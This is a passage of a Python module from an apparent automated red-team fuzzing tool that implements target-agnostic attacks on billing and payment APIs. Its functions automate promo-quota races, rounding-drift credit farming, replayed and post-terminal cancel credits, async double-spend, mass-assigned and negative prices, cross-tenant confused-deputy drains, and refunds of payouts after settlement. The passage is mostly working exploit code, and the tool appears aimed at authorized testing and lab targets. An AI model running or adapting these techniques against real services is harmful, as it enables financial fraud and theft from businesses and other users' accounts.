"""Generic technique library (v0.2 fortress upgrade).

These techniques are TARGET-AGNOSTIC: every path, field name, enum value and
object id is derived at runtime from the SURFACE fact (openapi resource graph)
and from live responses. No dvlba-shop or helios-billing constants appear in
this file. Exploit uses them to test hypotheses; VERIFY re-runs the SAME code
with fresh principals for independent verification (grounded-only, E3).

Artifact exception: engagement-brief artifacts (e.g. a campaign promo code)
arrive via ctx["artifacts"] — a real red team receives known campaign tokens.
Behaviour is still proven by execution, never assumed.

Contract:
    run(tag, env) -> [finding_dict | observation_dict, ...]
    env.notes  : shared side-channel {"artifact_consumed": bool,
                                      "hidden_verbs": {resource: [verbs]}}

Honesty rules: a technique whose surface prerequisites are absent returns []
(skipped — no bandit penalty); violations are reported only from wallet /
state read-backs; a consumed single-use artifact is reported via notes so
verification can honestly downgrade to transcript-verified.
"""
import re
import time

from statefuzz.executor import Principal

CLAIM_VERBS = {"claim", "redeem", "consume", "activate"}
CANCEL_VERBS = {"cancel", "revoke", "close", "terminate"}
TRANSFER_VERBS = {"transfer", "send", "move", "gift"}
MONEY_HINTS = ("balance", "credit", "wallet")
VERB_WORDLIST = ("release", "settle", "capture", "approve", "confirm",
                 "complete", "retry", "restore", "refund", "revoke")
PRICE_CANDIDATES = ("unit_price_cents", "unit_cents", "price_cents",
                    "amount_cents", "discount_pct")
# G1(a): standard async money-resource nouns — the probe LIST only finds a
# candidate route; the MARKER is registered solely from an observed
# 202/event shape (grounded-only, E6). Presence classification: 404/405
# means absent; any validation/auth status means the resource exists.
ASYNC_SEAM_NOUNS = ("payouts", "withdrawals", "settlements", "refunds",
                    "transfers", "disbursements")

# M2 (G2+G4): the open vocabularies live in the spine (engine/surface.py)
# — VALUE_NOUNS, VERB_VOCAB, SUBPATH_NOUNS, CLAIM_CONSUME — so tests and
# the M5 LLM seam can extend them as data. This module imports them lazily
# inside t_open_vocab and degrades to the v1 path when the spine is absent.


# ------------------------------------------------- U3: schema-from-errors --
def _learn_contract(env, p, path, method="POST"):
    """hard-lab upgrade U3 (RESEARCH.md D8): probe a route with an empty body
    and learn its request contract from the 422 error document. This is the
    openapi-less analogue of reading requestBody schemas — validation layers
    disclose required fields, types and minimums. Returns {field: spec}."""
    r = env.ex.request(p, method, path, body={}, phase=env.phase,
                       tag="schema-discovery")
    if r["status"] not in (400, 422):
        return {}
    body = r["resp_body"] if isinstance(r["resp_body"], dict) else {}
    contract = body.get("error") if isinstance(body.get("error"), dict) \
        else body
    if not isinstance(contract, dict):
        return {}
    missing = contract.get("missing_fields") or contract.get("required") \
        or []
    types = contract.get("types") or {}
    minimums = contract.get("minimums") or {}
    learned = {f: {"type": types.get(f, "string"), "minimum": minimums.get(f)}
               for f in missing}
    # correction pass: an invalid_fields message often states the expected
    # type ("must be integer >= 100") — derive it instead of guessing wrong.
    for f, msg in (contract.get("invalid_fields") or {}).items():
        m = str(msg).lower()
        if "integer" in m:
            learned[f] = {"type": "integer", "minimum": minimums.get(f)}
        elif "string" in m:
            learned[f] = {"type": "string", "minimum": None}
    return learned


def _hydrate_action(env, p, action, sample_path):
    """U3: fill an action's unknown schema in place from the error contract."""
    if action.get("schema") and not action.get("schema_unknown"):
        return action.get("schema") or {}
    learned = _learn_contract(env, p, sample_path,
                              action.get("method", "POST"))
    if learned:
        action["schema"] = learned
        action["schema_unknown"] = False
    return action.get("schema") or {}


def _body_from_schema(schema):
    """Render a lawful body from a (possibly learned) schema."""
    body = {}
    for f, spec in (schema or {}).items():
        if isinstance(spec, dict) and spec.get("enum"):
            body[f] = spec["enum"][0]
        elif isinstance(spec, dict) and spec.get("type") == "integer":
            body[f] = max(2, spec.get("minimum", 1) or 1)
        elif isinstance(spec, dict) and spec.get("type") == "string":
            body[f] = "sf-probe"
    return body
EST = {"h_quota_race": 50, "h_arith_cycle": 40, "h_state_guard": 14,
       "h_async_toctou": 18, "h_mass_assign": 18, "h_cross_tenant": 24,
       "h_hidden_verbs": 20, "h_terminal_credit": 20,
       "h_async_seam": 16, "h_open_vocab": 80, "h_value_replay": 16,
       "h_credit_race": 22, "h_state_skip": 34, "h_fsm_live": 26}

GENERIC_TAGS = tuple(EST)


# ------------------------------------------------------------------ env ----
class Env:
    """Per-technique-run environment: executor + surface + budget guard.
    M3: an optional ambient WalletWatcher — register() adopts every new
    principal so money movement during the act is observed at the balance,
    not inferred from response keys."""

    def __init__(self, ex, anon, surface, budget, artifacts=None,
                 phase="technique", notes=None, watch=None):
        self.ex = ex
        self.anon = anon
        self.surface = surface or {}
        self.budget = budget
        self.artifacts = artifacts or {}
        self.phase = phase
        self.notes = notes if notes is not None else {}
        self.cache = {}
        self.watch = watch

    def remaining(self):
        return self.budget - self.ex.count

    def register(self, nick):
        ex = self.ex
        name = "%s-%s-%d" % (nick, ex.count, int(time.time() * 1000) % 10**6)
        ex.request(self.anon, "POST", "/api/register",
                   body={"username": name, "password": "pw-" + name},
                   phase=self.phase, tag="bootstrap")
        r = ex.request(self.anon, "POST", "/api/login",
                       body={"username": name, "password": "pw-" + name},
                       phase=self.phase, tag="bootstrap")
        p = Principal(name, token=r["resp_body"].get("token"))
        ex.principals[name] = p
        if self.watch is not None:      # M3: baseline for the ambient oracle
            try:
                self.watch.adopt(p)
            except Exception:
                pass
        return p

    def wallet(self, p):
        """Discovered money read-back: first readback path returning an
        integer field named like balance/credit/wallet. Discovery failure is
        cached PER PRINCIPAL (M5 fix): an anon 401 is not evidence that no
        balance path exists — the next authenticated principal retries."""
        if not self.cache.get("balance_path") and \
                p.name not in self.cache.setdefault("balance_failed", set()):
            self.cache["balance_path"] = None
            self.cache["balance_field"] = None
            for path in self.surface.get("readback", []):
                r = self.ex.request(p, "GET", path, phase=self.phase,
                                    tag="balance-probe")
                body = r["resp_body"]
                if isinstance(body, dict):
                    for k, v in body.items():
                        if isinstance(v, int) and \
                                any(h in k.lower() for h in MONEY_HINTS):
                            self.cache["balance_path"] = path
                            self.cache["balance_field"] = k
                            break
                if self.cache["balance_path"]:
                    break
            if not self.cache["balance_path"]:
                self.cache["balance_failed"].add(p.name)
        path = self.cache.get("balance_path")
        if not path:
            return None
        r = self.ex.request(p, "GET", path, phase=self.phase, tag="wallet")
        return r["resp_body"].get(self.cache["balance_field"])

    def create(self, p, g, overrides=None):
        """Lawful create from the surface schema, with a size ladder for
        minimums the document does not declare — and (hard-lab upgrade U3)
        schema-from-errors: when the surface carries no schema, a 422 error
        contract is learned once and persisted onto the resource graph.
        Returns the response or None. The successful request body is attached
        as resp['_body']."""
        if not g.get("create"):
            return None
        schema = g.get("create_schema") or {}
        body = _body_from_schema(schema)
        body.update(overrides or {})
        learned_rounds = 0
        for mult in (1, 5, 25):            # size ladder for undeclared mins
            attempt = dict(body)
            for f, spec in schema.items():
                if isinstance(spec, dict) and spec.get("type") == "integer" \
                        and f not in (overrides or {}):
                    attempt[f] = body[f] * mult
            r = self.ex.request(p, "POST", g["create"], body=attempt,
                                phase=self.phase, tag="create")
            if 200 <= r["status"] < 300:
                r["_body"] = attempt
                return r
            if r["status"] in (400, 422) and learned_rounds < 2:
                learned_spec = _learn_contract(self, p, g["create"])
                if learned_spec:
                    schema = dict(schema, **learned_spec)
                    g["create_schema"] = schema    # persist for later runners
                    body = _body_from_schema(schema)
                    body.update(overrides or {})
                    learned_rounds += 1
                continue
            if r["status"] not in (400, 422):
                return None
        return None


# ----------------------------------------------------------- selectors ----
def _res_actions(surface, verbset):
    out = []
    for res, g in (surface.get("resource_actions") or {}).items():
        for a in g.get("actions", []):
            if a.get("verb") in verbset:
                out.append((res, g, a))
    return out


def _object_id(res, create_resp):
    key = res.rstrip("s") + "_id"
    body = create_resp["resp_body"]
    if key in body:
        return body[key]
    for k, v in body.items():
        if k.endswith("_id") and isinstance(v, str):
            return v
    return None


_MONEYISH = re.compile(r"(amount|price|rate|face|credit|bonus|payout|"
                       r"refund)", re.I)


def _face_value(body):
    """The object's face value: the first money-ish integer field in its own
    create response (voucher face_cents, payout amount_cents, ...)."""
    if not isinstance(body, dict):
        return None
    for k, v in body.items():
        if isinstance(v, int) and not isinstance(v, bool) and \
                _MONEYISH.search(k):
            return v
    return None


# universal auth vocabulary — creates on these resources are bootstrap, not
# business objects; probing them wastes budget and risks lockouts
_AUTH_RESOURCES = {"login", "register", "logout", "signup", "session",
                   "auth", "token", "password", "users"}


def _richness(g):
    """Candidate ordering: schema-rich creates (enum > integer > string) are
    more likely to be business objects. Neutralises alphabetical JSON key
    ordering in served openapi documents."""
    s = g.get("create_schema") or {}
    vals = [v for v in s.values() if isinstance(v, dict)]
    if any(v.get("enum") for v in vals):
        return 0
    if any(v.get("type") == "integer" for v in vals):
        return 1
    return 2


def _action_body(a, overrides=None):
    schema = a.get("schema") or {}
    body = {}
    for f, spec in schema.items():
        if isinstance(spec, dict) and spec.get("enum"):
            body[f] = spec["enum"][0]
        elif isinstance(spec, dict) and spec.get("type") == "integer":
            body[f] = max(1, spec.get("minimum", 1) or 1)
        elif isinstance(spec, dict) and spec.get("type") == "string":
            body[f] = "dissatisfaction"
    body.update(overrides or {})
    return body


def _string_fields(schema):
    return [f for f, s in (schema or {}).items()
            if isinstance(s, dict) and s.get("type") == "string"
            and not s.get("enum")]


def _int_fields(schema):
    return [f for f, s in (schema or {}).items()
            if isinstance(s, dict) and s.get("type") == "integer"]


def _finding(fid, title, sev, invar, ops, endpoint, evidence, pres, grants):
    return {"id": fid, "title": title, "severity": sev, "invariant": invar,
            "operators": ops, "endpoint": endpoint, "evidence": evidence,
            "preconditions": pres, "grants": grants,
            "reproduction": [], "confidence": "high"}


def _poll_event(env, p, event, timeout=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        er = env.ex.request(p, "GET", event, phase=env.phase, tag="event-poll")
        st = er["resp_body"].get("status")
        if st not in (None, "pending"):
            return st
        time.sleep(0.1)
    return None


# ------------------------------------------------------------- runners ----
def t_quota_race(env):
    """Quota-style claim artifact loses the check-then-act race to N distinct
    principals (per-account guards defeat single-identity races)."""
    claims = _res_actions(env.surface, CLAIM_VERBS)
    if not claims:
        return []
    res, g, a = claims[0]
    if "{%s}" % (g.get("param_name") or "") in a["path"]:
        return []                       # claim bound to an object: other shape
    code = env.artifacts.get("promo_code")
    if not code:
        return []                       # no campaign artifact in the brief
    fields = _string_fields(a.get("schema"))
    body = {fields[0]: code} if fields else {"code": code}
    racers = [env.register("qrc%d" % i) for i in range(8)]
    if env.remaining() < 12:
        return []
    results = env.ex.race_multi(racers, "POST", a["path"], body,
                                phase=env.phase, tag="quota-race")
    wins = [r for r in results if 200 <= (r["status"] or 0) < 300]
    env.notes["artifact_consumed"] = bool(wins) or \
        any((r["status"] or 0) == 409 for r in results)
    if not wins:
        return []
    # learn the advertised quota: exhaust with fresh identities until 409
    quota = None
    for _ in range(5):
        if env.remaining() < 4:
            break
        c = env.register("qrx")
        r = env.ex.request(c, "POST", a["path"], body=body, phase=env.phase,
                           tag="exhaust")
        if r["status"] == 409:
            ints = {k: v for k, v in r["resp_body"].items()
                    if isinstance(v, int)}
            quota = ints.get("quota") or (max(ints.values()) if ints else None)
            break                       # exhausted either way; disclosure optional
    if quota is None or len(wins) <= quota:
        return []
    return [_finding(
        "FW-QUOTA-RACE",
        "Quota-limited claim loses the check-then-act race: %d distinct "
        "principals claimed past the advertised quota of %s"
        % (len(wins), quota), "high", "I5", ["INTERRUPT", "CROSS-USER"],
        "POST " + a["path"],
        [{"race_n": len(racers), "successful_claims": len(wins),
          "advertised_quota": quota,
          "winning_principals": sorted({r["resp_body"].get("claimed")
                                        for r in wins})[:8],
          "last_byte_sync": True}],
        ["any account", "campaign artifact from the engagement brief"],
        ["claim the artifact once per concurrent identity, multiplying its "
         "value past the quota"])]


def t_arith_cycle(env):
    """Repeated value-neutral cycles of an integer-bounded transition must not
    accumulate balance. Asymmetric rounding reveals itself only in aggregate."""
    cands = []
    for res, g in (env.surface.get("resource_actions") or {}).items():
        if not g.get("create"):
            continue
        for a in g.get("actions", []):
            if a.get("method") == "POST" and (_int_fields(a.get("schema"))
                                              or a.get("schema_unknown")):
                cands.append((res, g, a))
    if not cands:
        return []
    for res, g, a in cands:            # U3: try candidates until one hydrates
        p = env.register("cyc")
        cr = env.create(p, g)
        if not cr:
            continue
        oid = _object_id(res, cr)
        if not oid:
            continue
        _hydrate_action(env, p, a,                     # hard-lab upgrade U3
                        a["path"].replace("{%s}" % g["param_name"], oid))
        ints = _int_fields(a["schema"])
        if not ints:
            continue
        field = ints[0]
        v_up = cr["_body"].get(field, 2)
        v_dn = v_up - 1                # MINIMAL delta: drift lives in the
        if v_dn < 1:                   # rounding remainder of 1 unit
            continue
        w0 = env.wallet(p)
        if w0 is None or env.remaining() < 30:
            return []
        path = a["path"].replace("{%s}" % g["param_name"], oid)
        credit_seen, net = False, 0
        for i in range(12):
            env.ex.request(p, "POST", path, body={field: v_dn},
                           phase=env.phase, tag="cycle-down")
            w_mid = env.wallet(p)
            env.ex.request(p, "POST", path, body={field: v_up},
                           phase=env.phase, tag="cycle-up")
            w_now = env.wallet(p)
            if w_mid is None or w_now is None:
                return []
            if w_mid > w0:
                credit_seen = True
            net = w_now - w0
            if i >= 2 and net > 0 and credit_seen:
                break
        if not (credit_seen and net > 0):
            continue
        return [_finding(
            "FW-ROUND-DRIFT",
            "Value-neutral resize cycles accumulate balance (+%d cents within 12 "
            "round-trips): credit rounds up, charge rounds down" % net,
            "medium", "I4", ["REPLAY"], "POST %s (resize-cycle)" % a["path"],
            [{"cycles": 12, "net_delta_cents": net,
              "expect": "0: down->up returns to the same state at the same price",
              "credit_seen": credit_seen}],
            ["any account", "own active subscription"],
            ["farm sub-cent proration drift into unlimited credit"])]
    return []


def t_state_guard(env):
    """Terminal-state transitions: after a lawful cancel, the same resource's
    other write verbs (and the cancel dedupe itself) must be closed."""
    cands = []
    for res, g, a in _res_actions(env.surface, CANCEL_VERBS):
        others = [x for x in g.get("actions", [])
                  if x is not a and x.get("method") == "POST"]
        if g.get("create") and others:
            cands.append((res, g, a, others))
    if not cands:
        return []
    res, g, cancel_a, others = cands[0]
    p = env.register("sgd")
    cr = env.create(p, g)
    if not cr or env.remaining() < 10:
        return []
    oid = _object_id(res, cr)
    if not oid:
        return []
    cpath = cancel_a["path"].replace("{%s}" % g["param_name"], oid)
    _hydrate_action(env, p, cancel_a, cpath)      # hard-lab upgrade U3
    body = _action_body(cancel_a)
    w0 = env.wallet(p)
    env.ex.request(p, "POST", cpath, body=body, phase=env.phase,
                   tag="lawful-cancel")
    w1 = env.wallet(p)
    if w0 is None or w1 is None or w1 <= w0:
        return []                       # cancel did not credit: shape differs
    out = []
    # --- replay identical body: must be guarded (dedupe evidence) ----------
    replay = env.ex.request(p, "POST", cpath, body=body, phase=env.phase,
                            tag="replay-cancel")
    # --- mutate ONE string field: dedupe keyed by the body, not the object --
    if env.remaining() >= 6:
        mutated = dict(body)
        for f in _string_fields(cancel_a.get("schema")):
            mutated[f] = "moving-abroad"
        w2 = env.wallet(p)
        r2 = env.ex.request(p, "POST", cpath, body=mutated, phase=env.phase,
                            tag="mutated-cancel")
        w3 = env.wallet(p)
        if replay["status"] == 409 and 200 <= r2["status"] < 300 and \
                w2 is not None and w3 is not None and w3 > w2:
            out.append(_finding(
                "FW-CANCEL-REASON",
                "Cancel dedupe is keyed by the reason string, not the object: "
                "a different reason re-credits the full remainder",
                "critical", "I1", ["REPLAY"],
                "POST " + cancel_a["path"],
                [{"lawful_cancel_credit": w1 - w0,
                  "identical_replay_status": replay["status"],
                  "mutated_cancel_status": r2["status"],
                  "second_credit_cents": w3 - w2,
                  "mutated_body": mutated}],
                ["any account", "own active subscription"],
                ["credit the same subscription's remainder repeatedly"]))
    # --- terminal state must close the resource's other write verbs ---------
    for other in others:
        if env.remaining() < 4:
            break
        opath0 = other["path"].replace("{%s}" % g["param_name"], oid)
        _hydrate_action(env, p, other, opath0)    # hard-lab upgrade U3
        obody = _action_body(other)
        ints = _int_fields(other.get("schema"))
        if ints:
            obody[ints[0]] = max(1, (other.get("schema", {})
                                     .get(ints[0], {}).get("minimum", 1)
                                     or 1))
        opath = other["path"].replace("{%s}" % g["param_name"], oid)
        w4 = env.wallet(p)
        ro = env.ex.request(p, "POST", opath, body=obody, phase=env.phase,
                            tag="terminal-mutate")
        w5 = env.wallet(p)
        if 200 <= ro["status"] < 300 and None not in (w4, w5) and w5 > w4:
            out.append(_finding(
                "FW-TERMINAL-RESIZE",
                "Write transition accepted on a CANCELED object: %s re-credits "
                "the full prorated remainder after cancel already did"
                % other["verb"], "high", "I2", ["SKIP"],
                "POST %s (terminal-state)" % other["path"],
                [{"canceled_object": oid, "verb": other["verb"],
                  "status": ro["status"], "credit_after_terminal": w5 - w4,
                  "unmodeled_transition": "canceled --%s--> credited"
                                          % other["verb"]}],
                ["any account", "own canceled subscription"],
                ["double every cancel by mutating afterwards"]))
    return out


def t_async_toctou(env):
    """Async create that debits at settle time with no re-check: empty the
    balance during the deferred window and the settle drives it negative."""
    asyncs = [(res, g) for res, g in
              (env.surface.get("resource_actions") or {}).items()
              if g.get("create")]
    transfers = _res_actions(env.surface, TRANSFER_VERBS)
    if not asyncs or not transfers:
        return []
    tres, tg, ta = transfers[0]
    probe = env.register("toca")
    _hydrate_action(env, probe, ta, ta["path"])   # hard-lab upgrade U3
    tints = _int_fields(ta.get("schema"))
    if not tints:
        return []
    p, chosen = None, None
    for res, g in asyncs:
        if env.remaining() < 8:
            break
        cand = env.register("toc")
        b = env.wallet(cand)
        if not b:
            continue
        learned = _learn_contract(env, cand, g["create"])  # U3
        if learned:
            g["create_schema"] = dict(g.get("create_schema") or {},
                                      **learned)
        ints = _int_fields(g.get("create_schema") or {})
        if not ints:
            continue
        r = env.ex.request(cand, "POST", g["create"],
                           body={ints[0]: max(100, b // 2)},
                           phase=env.phase, tag="async-create")
        if r["status"] == 202:
            p, chosen, amt = cand, (res, g, r, b, ints[0]), max(100, b // 2)
            break
    if not chosen:
        return []                       # no 202 async seam after all
    res, g, cr, b, amount_field = chosen
    acc = env.register("tacc")
    event = next((v for v in cr["resp_body"].values()
                  if isinstance(v, str) and v.startswith("/")), None)
    # drain the balance inside the deferred window
    env.ex.request(p, "POST", ta["path"],
                   body=_action_body(ta, {tints[0]: b,
                                          "to_account": acc.name}),
                   phase=env.phase, tag="window-drain")
    if event:
        _poll_event(env, p, event)
    else:
        time.sleep(0.9)
    final = env.wallet(p)
    if final is None or final >= 0:
        return []
    return [_finding(
        "FW-TOCTOU-SETTLE",
        "Async settle debits without a balance re-check: draining the wallet "
        "inside the deferred window drives the balance negative (%d)" % final,
        "critical", "I4", ["INTERRUPT"], "POST " + g["create"],
        [{"balance_before": b, "drained_during_window": b,
          "settled_amount": amt, "final_balance": final, "event": event}],
        ["any account", "recipient account"],
        ["double-spend the prepaid balance across the async seam"])]


def t_mass_assign(env):
    """Undocumented fields that corrupt pricing or entitlements: differential
    probe (lawful body vs lawful body + candidate field)."""
    creates = [(r, g) for r, g in
               (env.surface.get("resource_actions") or {}).items()
               if g.get("create") and r not in _AUTH_RESOURCES]
    creates.sort(key=lambda rg: _richness(rg[1]))   # rich schemas first
    if not creates:
        return []
    res, g = creates[0]
    p = env.register("mas")
    base = env.create(p, g)
    if not base or env.remaining() < 12:
        return []
    out = []
    schema = g.get("create_schema") or {}
    base_body = dict(base["_body"])
    base_ints = {k: v for k, v in base["resp_body"].items()
                 if isinstance(v, int)}
    # ---- pricing field override ------------------------------------------
    # M2 (GV-3): echo-mined fields FIRST — the target names its own price
    # field in the create response, evidence beats wordlist — then the
    # legacy candidates, never regress. On an override hit, one NEGATIVE
    # escalation: a server-trusted price field must CREDIT on -50000.
    mined = [c for c in (g.get("mined_fields") or []) if c not in schema]
    price_cands = mined + [c for c in PRICE_CANDIDATES
                           if c not in mined and c not in schema]
    for cand in price_cands:
        if cand in schema or env.remaining() < 6:
            continue
        r = env.ex.request(p, "POST", g["create"],
                           body=dict(base_body, **{cand: 1}),
                           phase=env.phase, tag="mass-assign-price")
        if not (200 <= r["status"] < 300):
            continue
        injected = {k: v for k, v in r["resp_body"].items()
                    if isinstance(v, int)}
        diff = {k for k in set(base_ints) & set(injected)
                if injected[k] != base_ints[k] and injected[k] < base_ints[k]}
        if not diff:
            continue
        neg_credit = None
        w_pre = env.wallet(p)
        if w_pre is not None and env.remaining() >= 3:
            rn = env.ex.request(p, "POST", g["create"],
                                body=dict(base_body, **{cand: -50000}),
                                phase=env.phase, tag="mass-assign-negative")
            w_post = env.wallet(p)
            if 200 <= rn["status"] < 300 and None not in (w_pre, w_post) \
                    and w_post > w_pre:
                neg_credit = w_post - w_pre
        out.append(_finding(
            "FW-MASS-PRICE",
            "Mass assignment: client-supplied %s overrides server-side "
            "pricing (differential: lawful totals vs injected totals)%s"
            % (cand, "; NEGATIVE value CREDITED the wallet (+%d)" % neg_credit
               if neg_credit else ""),
            "critical" if neg_credit else "high", "I4",
            ["PARTIAL", "NEGATIVE"] if neg_credit else ["PARTIAL"],
            "POST %s (mass-assign:price)" % g["create"],
            [{"candidate_field": cand, "lawful": base_ints,
              "injected": injected, "differing_fields": sorted(diff),
              "mined_from_echo": cand in mined,
              "negative_probe_credit": neg_credit}],
            ["any account"], ["name the price of any future invoice"]))
        break
    # ---- entitlement field on a param action ------------------------------
    enums = {f: s["enum"] for f, s in schema.items()
             if isinstance(s, dict) and s.get("enum") and len(s["enum"]) > 1}
    actions2 = [a for a in g.get("actions", [])
                if a.get("method") == "POST" and _int_fields(a.get("schema"))]
    if not (enums and actions2) or env.remaining() < 10:
        return out
    plan_field = sorted(enums)[0]
    alt = enums[plan_field][1]
    cr2 = env.create(p, g)
    cr3 = env.create(p, g)
    if not cr2 or not cr3 or env.remaining() < 8:
        return out
    a2 = actions2[0]
    oid2, oid3 = _object_id(res, cr2), _object_id(res, cr3)
    if not oid2 or not oid3:
        return out
    f2 = _int_fields(a2["schema"])[0]
    v = max(1, (a2["schema"].get(f2, {}).get("minimum", 1) or 1)) + 1
    p2 = a2["path"].replace("{%s}" % g["param_name"], oid2)
    p3 = a2["path"].replace("{%s}" % g["param_name"], oid3)
    rb = env.ex.request(p, "POST", p2, body={f2: v}, phase=env.phase,
                        tag="baseline-resize")
    ri = env.ex.request(p, "POST", p3, body={f2: v, plan_field: alt},
                        phase=env.phase, tag="escalate-resize")
    if not (200 <= rb["status"] < 300 and 200 <= ri["status"] < 300):
        return out
    rd = env.ex.request(p, "GET",
                        g["param"].replace("{%s}" % g["param_name"], oid3),
                        phase=env.phase, tag="escalate-readback")
    d_base, d_inj = rb["resp_body"].get("delta_cents"), \
        ri["resp_body"].get("delta_cents")
    same_price = (d_base is not None and d_inj is not None
                  and d_base == d_inj)
    changed = rd["resp_body"].get(plan_field) == alt
    if changed and same_price:
        out.append(_finding(
            "FW-MASS-PLAN",
            "Mass assignment: undocumented %s field on %s switches the "
            "entitlement tier without repricing" % (plan_field, a2["verb"]),
            "medium", "I4", ["PARTIAL"],
            "POST %s (mass-assign:plan)" % a2["path"],
            [{"field": plan_field, "escalated_to": alt,
              "baseline_delta": d_base, "escalated_delta": d_inj,
              "readback_plan": rd["resp_body"].get(plan_field)}],
            ["any account"], ["upgrade tiers at the old price"]))
    return out


def t_cross_tenant(env):
    """Global read-backs leak other tenants' object ids; a write on the leaked
    object then pays the CALLER (confused deputy). One flow, two findings."""
    cands = []
    for res, g in (env.surface.get("resource_actions") or {}).items():
        if g.get("create") and g.get("param") and \
                res not in _AUTH_RESOURCES:
            writes = [a for a in g.get("actions", [])
                      if a.get("method") == "POST"]
            if writes:
                cands.append((res, g, writes))
    # prefer resources whose writes carry integer bodies (priced transitions)
    cands.sort(key=lambda c: 0 if any(_int_fields(a.get("schema"))
                                      for a in c[2]) else 1)
    if not cands:
        return []
    res, g, writes = cands[0]
    victim = env.register("xtv")
    cr = env.create(victim, g)
    if not cr or env.remaining() < 16:
        return []
    oid = _object_id(res, cr)
    if not oid:
        return []
    atk = env.register("xta")
    leak_path, leaked = None, False
    for path in env.surface.get("readback", []):
        if "{" in path or env.remaining() < 3:
            continue
        r = env.ex.request(atk, "GET", path, phase=env.phase,
                           tag="cross-tenant-read")
        if oid in str(r["resp_body"]):
            leak_path, leaked = path, True
            break
    out = []
    singular = res.rstrip("s")
    id_grant = "knowledge of any %s identifier" % singular
    if leaked:
        out.append(_finding(
            "FW-AUDIT-LEAK",
            "Cross-tenant object disclosure: a fresh principal reads another "
            "tenant's %s identifier from %s" % (singular, leak_path),
            "medium", "I3", ["CROSS-USER"], "GET " + leak_path,
            [{"victim": victim.name, "leaked_id": oid,
              "leak_path": leak_path}],
            ["any account"], [id_grant]))
    for a in writes:                    # confused deputy on the leaked object
        path = a["path"].replace("{%s}" % g["param_name"], oid)
        _hydrate_action(env, atk, a, path)        # hard-lab upgrade U3
        ints = _int_fields(a.get("schema"))
        if not leaked:
            break
        # M2 (GV-2): discovered verbs have no schema — an empty body IS the
        # lawful probe (rebook shape); doc verbs keep the integer body.
        body = {ints[0]: 1} if ints else {}
        if env.remaining() < 4:
            break
        w0 = env.wallet(atk)
        r = env.ex.request(atk, "POST", path, body=body,
                           phase=env.phase,
                           tag="deputy-write" if ints else "deputy-write-discovered")
        w1 = env.wallet(atk)
        if 200 <= r["status"] < 300 and None not in (w0, w1) and w1 > w0:
            out.append(_finding(
                "FW-DEPUTY-CREDIT",
                "No ownership check on %s: the credit lands in the "
                "CALLER's balance — monetize any leaked tenant's object "
                % a["verb"], "critical", "I3", ["CROSS-USER"],
                "POST %s (cross-tenant)" % a["path"],
                [{"victim": victim.name, "attacker": atk.name,
                  "object": oid, "attacker_gain": w1 - w0,
                  "verb": a["verb"], "body": body,
                  "discovered_verb": bool(a.get("discovered")),
                  "obtained_via": leak_path}],
                [id_grant],
                ["drain any tenant's object value into your own balance"]))
            break
    return out


def t_hidden_verbs(env):
    """Undocumented verbs on parameterised money resources (ops endpoints that
    never made it into the openapi document). Publishes an OBSERVATION."""
    cands = []
    for res, g in (env.surface.get("resource_actions") or {}).items():
        if g.get("param") and g.get("create"):
            known = {a["verb"] for a in g.get("actions", [])}
            money = any(a.get("verb") in CANCEL_VERBS | CLAIM_VERBS
                        | TRANSFER_VERBS or _int_fields(a.get("schema"))
                        for a in g.get("actions", []))
            if money:
                cands.append((res, g, known))
    if not cands or env.remaining() < EST["h_hidden_verbs"]:
        return []
    found_all = {}
    for res, g, known in cands:          # probe EVERY money resource
        if env.remaining() < 12:
            break
        p = env.register("hdv")
        cr = env.create(p, g)
        if not cr:
            continue
        oid = _object_id(res, cr)
        if not oid:
            continue
        found = []
        for verb in VERB_WORDLIST:
            if verb in known or env.remaining() < 2:
                continue
            path = "/api/%s/%s/%s" % (res, oid, verb)
            r = env.ex.request(p, "POST", path, body={}, phase=env.phase,
                               tag="verb-probe")
            if r["status"] not in (404, 405):
                found.append((verb, r["status"]))
        if found:
            found_all[res] = found
    env.notes.setdefault("hidden_verbs", {}).update(found_all)
    if not found_all:
        return []
    return [{"kind": "OBSERVATION",
             "payload": {"hidden_endpoints": [
                 {"verb": v, "probe_status": st, "resource": res}
                 for res, lst in found_all.items() for v, st in lst]}}]


def t_terminal_credit(env):
    """Cancel-after-settle: the refund path must be closed once the external
    transfer stands. Prefers a hidden release verb, else awaits the worker.
    Iterates candidate resources until one actually settles with a debit."""
    cands = []
    for res, g in (env.surface.get("resource_actions") or {}).items():
        if not g.get("create"):
            continue
        cancels = [a for a in g.get("actions", [])
                   if a.get("verb") in CANCEL_VERBS]
        if cancels:
            cands.append((res, g, cancels[0]))
    if not cands:
        return []
    for res, g, cancel_a in cands:
        p = env.register("tcm")
        b = env.wallet(p)
        if not b or b < 300 or env.remaining() < 12:
            continue
        learned = _learn_contract(env, p, g["create"])   # U3
        if learned:
            g["create_schema"] = dict(g.get("create_schema") or {},
                                      **learned)
        ints = _int_fields(g.get("create_schema") or {})
        if not ints:
            continue
        amount = max(100, b // 3)
        cr = env.ex.request(p, "POST", g["create"], body={ints[0]: amount},
                            phase=env.phase, tag="payout-create")
        if not (200 <= cr["status"] < 300):
            continue
        pid = _object_id(res, cr)
        event = next((v for v in cr["resp_body"].values()
                      if isinstance(v, str) and v.startswith("/")), None)
        w0 = env.wallet(p)
        # settle: hidden release first (accelerator), else await the worker
        released = False
        for verb, _st in env.notes.get("hidden_verbs", {}).get(res, []):
            r = env.ex.request(p, "POST", "/api/%s/%s/%s" % (res, pid, verb),
                               body={}, phase=env.phase, tag="hidden-release")
            if 200 <= r["status"] < 300:
                released = True
                break
        if not released:
            if event:
                _poll_event(env, p, event)
            else:
                time.sleep(0.9)
        w1 = env.wallet(p)
        settled_debit = (None not in (w0, w1) and w1 < w0)
        if not settled_debit:
            continue                  # this resource settles without a debit
        cpath = cancel_a["path"].replace("{%s}" % g["param_name"], pid)
        rc = env.ex.request(p, "POST", cpath, body={}, phase=env.phase,
                            tag="cancel-after-settle")
        w2 = env.wallet(p)
        if not (200 <= rc["status"] < 300 and w2 is not None and
                w2 - w1 >= amount):
            continue
        return [_finding(
            "FW-SETTLED-CANCEL",
            "Payout cancel accepted after settlement: the balance is refunded "
            "while the external transfer stands (net position restored, value "
            "delivered)", "critical", "I1", ["SKIP"],
            "POST " + cancel_a["path"],
            [{"payout": pid, "amount": amount, "settled_debit": w0 - w1,
              "cancel_credit": w2 - w1, "net_position": w2 - w0,
              "settled_via": "hidden release" if released
                             else "async worker"}],
            ["any account", "own payout"],
            ["receive the external payout AND keep the balance"])]
    return []


def t_async_seam(env):
    """G1(a): a money surface with NO documented async seam may hide one.
    Probes the standard async money-resource nouns, learns the create field
    from the validation error (U3 analogue), opens ONE seam, and publishes
    the async-opened observation the window driver consumes. Discovery is
